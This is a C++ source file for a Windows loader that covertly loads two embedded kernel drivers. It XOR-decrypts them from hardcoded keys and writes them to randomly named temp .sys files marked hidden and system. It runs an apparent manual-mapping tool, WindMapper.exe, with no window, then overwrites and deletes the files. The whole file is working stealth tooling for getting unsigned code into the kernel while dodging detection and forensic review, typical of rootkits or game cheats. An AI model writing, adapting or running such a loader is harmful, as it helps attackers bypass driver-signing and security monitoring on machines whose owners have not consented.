#include "driver_loader.hpp"
#include "whoswho_encrypted.h"
#include "sentinel_encrypted.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>

namespace
{
    static constexpr unsigned char WHOSWHO_KEY[] = {
        0xA3, 0x5F, 0x17, 0xD2, 0x8B, 0x64, 0xE9, 0x31,
        0xCC, 0x4A, 0x76, 0xF0, 0x0E, 0x93, 0xB8, 0x2D
    };

    static constexpr unsigned char SENTINEL_KEY[] = {
        0xD7, 0x2B, 0x83, 0x4E, 0xF1, 0x69, 0xA5, 0x1C,
        0x38, 0xE0, 0x54, 0x9F, 0x7A, 0xC6, 0x0D, 0xB2
    };

    bool g_loaded = false;

    std::wstring get_temp_sys_path()
    {
        wchar_t tmp[MAX_PATH] = {};
        if (!GetTempPathW(MAX_PATH, tmp))
            return {};
        wchar_t file[MAX_PATH] = {};
        if (!GetTempFileNameW(tmp, L"drv", 0, file))
            return {};

        std::wstring path(file);
        DeleteFileW(path.c_str());
        path += L".sys";
        return path;
    }

    bool decrypt_and_write(const unsigned char* enc, unsigned long enc_size,
                           const unsigned char* key, size_t key_len,
                           const std::wstring& out_path)
    {
        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, enc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf)
            return false;

        for (unsigned long i = 0; i < enc_size; ++i)
            buf[i] = enc[i] ^ key[i % key_len];

        if (buf[0] != 'M' || buf[1] != 'Z') {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, enc_size, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, enc_size);
        VirtualFree(buf, 0, MEM_RELEASE);

        return ok && written == enc_size;
    }

    std::wstring find_mapper_exe()
    {
        wchar_t self[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, self, MAX_PATH);

        std::wstring dir(self);
        auto slash = dir.find_last_of(L"\\/");
        if (slash != std::wstring::npos)
            dir.resize(slash + 1);

        std::wstring candidate = dir + L"WindMapper.exe";
        if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES)
            return candidate;

        return {};
    }

    void secure_delete(const std::wstring& path)
    {
        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER size;
            if (GetFileSizeEx(hf, &size) && size.QuadPart > 0) {
                auto* zeros = static_cast<unsigned char*>(
                    VirtualAlloc(nullptr, static_cast<SIZE_T>(size.QuadPart),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
                if (zeros) {
                    DWORD written = 0;
                    WriteFile(hf, zeros, static_cast<DWORD>(size.QuadPart), &written, nullptr);
                    FlushFileBuffers(hf);
                    VirtualFree(zeros, 0, MEM_RELEASE);
                }
            }
            CloseHandle(hf);
        }
        DeleteFileW(path.c_str());
    }
}

namespace driver_loader
{
    bool is_driver_loaded()
    {
        return g_loaded;
    }

    bool initialize_and_load()
    {
        if (g_loaded)
            return true;

        std::wstring mapper_path = find_mapper_exe();
        if (mapper_path.empty()) {
            OutputDebugStringA("driver_loader: WindMapper.exe not found next to executable\n");
            return false;
        }

        std::wstring whoswho_path = get_temp_sys_path();
        std::wstring sentinel_path = get_temp_sys_path();
        if (whoswho_path.empty() || sentinel_path.empty())
            return false;

        if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
                               WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
            OutputDebugStringA("driver_loader: failed to decrypt WhosWho.sys\n");
            return false;
        }

        if (!decrypt_and_write(g_sentinel_encrypted, g_sentinel_encrypted_size,
                               SENTINEL_KEY, sizeof(SENTINEL_KEY), sentinel_path)) {
            OutputDebugStringA("driver_loader: failed to decrypt Sentinel.sys\n");
            secure_delete(whoswho_path);
            return false;
        }

        SetFileAttributesW(whoswho_path.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        SetFileAttributesW(sentinel_path.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

        std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                               whoswho_path + L"\" \"" + sentinel_path + L"\"";

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        BOOL created = CreateProcessW(
            mapper_path.c_str(),
            &cmdline[0],
            nullptr, nullptr,
            FALSE,
            CREATE_NO_WINDOW,
            nullptr, nullptr,
            &si, &pi);

        if (!created) {
            OutputDebugStringA("driver_loader: failed to launch WindMapper.exe\n");
            secure_delete(whoswho_path);
            secure_delete(sentinel_path);
            return false;
        }

        WaitForSingleObject(pi.hProcess, 60000);

        DWORD exit_code = 1;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        secure_delete(whoswho_path);
        secure_delete(sentinel_path);

        if (exit_code != 0) {
            OutputDebugStringA("driver_loader: WindMapper.exe returned non-zero exit code\n");
            return false;
        }

        g_loaded = true;
        return true;
    }
}
